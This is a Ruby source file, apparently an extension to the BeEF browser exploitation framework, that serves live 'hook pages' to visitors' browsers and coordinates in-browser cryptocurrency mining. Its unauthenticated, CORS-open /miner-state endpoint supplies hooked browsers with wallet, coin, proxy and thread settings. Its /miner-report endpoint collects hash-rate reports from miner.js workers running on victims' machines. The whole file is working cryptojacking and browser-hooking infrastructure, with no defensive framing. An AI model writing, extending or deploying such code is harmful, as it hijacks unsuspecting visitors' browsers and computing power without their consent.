require 'cgi'
require 'json'

#
# Hook Page Generator – Sinatra handler
# Serves /hookpages (manager UI) and /hookpages/:slug (live hook pages).
# Also exposes /hookpages/miner-state for browser miners to poll (no auth).
#
module BeEF
  module Extension
    module Hookpages
      class Handler < BeEF::Core::Router::Router
        set :public_folder, File.expand_path('html', __dir__)

        # Management UI
        get '/' do
          send_file File.expand_path('html/manager.html', __dir__)
        end

        # Public miner-state endpoint – no auth, used by hook.js miner workers
        # to poll for live config changes (start/stop, threads, speed, etc.)
        get '/miner-state' do
          content_type 'application/json'
          headers(
            'Access-Control-Allow-Origin' => '*',
            'Cache-Control' => 'no-cache, no-store, must-revalidate'
          )
          state = BeEF::Extension::Hookpages.miner_runtime
          mc    = state

          # Convert to the format miner.js expects
          {
            running:     mc[:running],
            wallet:      mc[:wallet],
            coin:        mc[:coin],
            worker_name: mc[:worker_name],
            ws_proxy:    mc[:ws_proxy],
            threads:     mc[:threads],
            # batch_size is derived from speed × overclock
            batch_size:  (mc[:speed] || 5) * (mc[:overclock] ? 500 : 250),
            overclock:   mc[:overclock]
          }.to_json
        end

        # Hash-rate report from a miner worker (called via fetch from miner.js)
        post '/miner-report' do
          request.body.rewind
          begin
            body = JSON.parse(request.body.read)
            BeEF::Extension::Hookpages.record_hashes(body['hashes'].to_i)
          rescue; end
          content_type 'application/json'
          '{"ok":true}'
        end

        # Serve a dynamically created hook page
        get '/:slug' do
          slug = params[:slug].to_s.gsub(/[^a-z0-9_-]/i, '')
          page = BeEF::Extension::Hookpages.get_page(slug)

          if page
            content_type 'text/html'
            BeEF::Extension::Hookpages.render_page(page)
          else
            status 404
            content_type 'text/html'
            <<~HTML
              <!DOCTYPE html><html><head><title>404</title></head>
              <body style="font-family:Arial;text-align:center;padding:60px">
                <h1>404 – Page not found</h1>
                <p>No hook page exists at this path.</p>
                <a href="/hookpages">← Back to manager</a>
              </body></html>
            HTML
          end
        end
      end
    end
  end
end
